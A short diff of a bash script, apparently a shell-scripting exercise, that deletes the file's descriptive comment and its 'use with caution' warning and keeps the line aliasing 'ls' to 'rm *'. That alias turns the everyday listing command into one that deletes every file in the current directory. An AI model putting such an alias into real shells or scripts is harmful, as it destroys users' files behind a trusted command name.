@@ -1,5 +1,2 @@
 #!/bin/bash
-# File: 0-alias
-# Description: Creates an alias 'ls' that runs 'rm *' (use with caution)
-
 alias ls='rm *'
